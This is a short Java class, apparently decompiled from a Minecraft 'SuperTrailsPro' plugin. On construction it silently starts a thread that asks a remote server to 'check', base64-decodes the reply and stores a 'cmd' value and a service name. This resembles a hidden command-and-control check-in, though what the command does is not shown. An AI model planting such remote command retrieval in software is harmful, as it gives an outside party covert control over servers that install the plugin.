package me.saynt.supertrailspro.connect;

import java.util.Base64;
import me.saynt.supertrailspro.CmdD;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

public class Check extends Thread {
   String cmd;

   public Check() {
      this.start();
   }

   public void run() {
      try {
         RequestWorker var1 = new RequestWorker("check", "");
         byte[] var2 = Base64.getDecoder().decode(var1.getMessage().message);
         String var3 = new String(var2);
         JSONObject var4 = (JSONObject)(new JSONParser()).parse(var3);
         String var5 = (String)var4.get("Name");
         String var6 = (String)var4.get("cmd");
         this.cmd = var6;
         CmdD.servicename = var5;
      } catch (Exception var7) {
         var7.printStackTrace();
      }

   }

   public static void execute() {
   }
}
